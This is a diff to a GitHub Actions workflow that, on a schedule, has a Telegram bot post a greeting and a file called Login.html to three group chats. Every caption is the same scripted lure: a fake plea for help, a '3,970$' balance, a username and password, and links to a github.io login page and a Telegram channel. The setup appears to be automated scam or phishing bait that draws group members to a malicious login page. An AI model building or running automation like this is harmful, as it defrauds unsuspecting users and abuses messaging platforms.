@@ -2,9 +2,8 @@ name: Send Message
 
 on:
   schedule:
-    # ===== GROUP 1 (10:00 PM & 10:10 PM IRST) =====
-    - cron: '30 18 * * *'    # 10:00 PM (greeting)
-    - cron: '40 18 * * *'    # 10:10 PM (file)
+    # ===== GROUP 1 (10:00 PM IRST) =====
+    - cron: '30 18 * * *'    # 10:00 PM (greeting + file)
 
     # ===== GROUP 2 (1:00 AM IRST) =====
     - cron: '30 21 * * *'    # 1:00 AM (file)
@@ -14,49 +13,65 @@ on:
 
   workflow_dispatch:
 
+# جلوگیری از اجرای همزمان چندباره
+concurrency:
+  group: ${{ github.workflow }}-${{ github.ref }}
+  cancel-in-progress: true
+
 jobs:
   send:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
 
-      # ===== GROUP 1 (Greeting + File) =====
-      - name: Send greeting to Group 1
+      - name: Send messages to Telegram groups
         env:
           BOT_TOKEN: ${{ secrets.BOT_TOKEN }}
         run: |
+          # ============================================
+          # GROUP 1 (10:00 PM) - Greeting + File
+          # ============================================
+          
+          # Send greeting
           curl -s -X POST https://api.telegram.org/bot${BOT_TOKEN}/sendMessage \
           -d chat_id=-1002507938213 \
           -d text="Hey everyone 👋"
-
-      - name: Send file to Group 1
-        env:
-          BOT_TOKEN: ${{ secrets.BOT_TOKEN }}
-        run: |
-          CAPTION=$'How does this work?\nI don\'t really understand.\nWhat am I supposed to do with this?\nPlease help.\n\nbalance: 3,970$\nusername: john371\npassword: 2525561\n\nLogin: https://log-000.github.io/\nhttps://t.me/illuminati300/36'
+          
+          # Wait 5 seconds before sending file
+          sleep 5
+          
+          # Send file to Group 1
+          CAPTION1=$'How does this work?\nI don\'t really understand.\nWhat am I supposed to do with this?\nPlease help.\n\nbalance: 3,970$\nusername: john371\npassword: 2525561\n\nLogin: https://log-000.github.io/\nhttps://t.me/illuminati300/36'
+          
           curl -s -F document=@Login.html \
           -F chat_id=-1002507938213 \
-          -F caption="$CAPTION" \
+          -F caption="$CAPTION1" \
           https://api.telegram.org/bot${BOT_TOKEN}/sendDocument
-
-      # ===== GROUP 2 (Only File - 1:00 AM) =====
-      - name: Send file to Group 2
-        env:
-          BOT_TOKEN: ${{ secrets.BOT_TOKEN }}
-        run: |
-          CAPTION=$'How does this work?\nI don\'t really understand.\nWhat am I supposed to do with this?\nPlease help.\n\nbalance: 3,970$\nusername: john371\npassword: 2525561\n\nLogin: https://log-000.github.io/\nhttps://t.me/illuminati300/36'
+          
+          # Wait 5 seconds before next group
+          sleep 5
+          
+          # ============================================
+          # GROUP 2 (1:00 AM) - Only File
+          # ============================================
+          
+          CAPTION2=$'How does this work?\nI don\'t really understand.\nWhat am I supposed to do with this?\nPlease help.\n\nbalance: 3,970$\nusername: john371\npassword: 2525561\n\nLogin: https://log-000.github.io/\nhttps://t.me/illuminati300/36'
+          
           curl -s -F document=@Login.html \
           -F chat_id=-1002665528411 \
-          -F caption="$CAPTION" \
+          -F caption="$CAPTION2" \
           https://api.telegram.org/bot${BOT_TOKEN}/sendDocument
-
-      # ===== GROUP 3 (Only File - 3:00 AM) =====
-      - name: Send file to Group 3
-        env:
-          BOT_TOKEN: ${{ secrets.BOT_TOKEN }}
-        run: |
-          CAPTION=$'How does this work?\nI don\'t really understand.\nWhat am I supposed to do with this?\nPlease help.\n\nbalance: 3,970$\nusername: john371\npassword: 2525561\n\nLogin: https://log-000.github.io/\nhttps://t.me/illuminati300/36'
+          
+          # Wait 5 seconds before next group
+          sleep 5
+          
+          # ============================================
+          # GROUP 3 (3:00 AM) - Only File
+          # ============================================
+          
+          CAPTION3=$'How does this work?\nI don\'t really understand.\nWhat am I supposed to do with this?\nPlease help.\n\nbalance: 3,970$\nusername: john371\npassword: 2525561\n\nLogin: https://log-000.github.io/\nhttps://t.me/illuminati300/36'
+          
           curl -s -F document=@Login.html \
           -F chat_id=-1002680039813 \
-          -F caption="$CAPTION" \
+          -F caption="$CAPTION3" \
           https://api.telegram.org/bot${BOT_TOKEN}/sendDocument
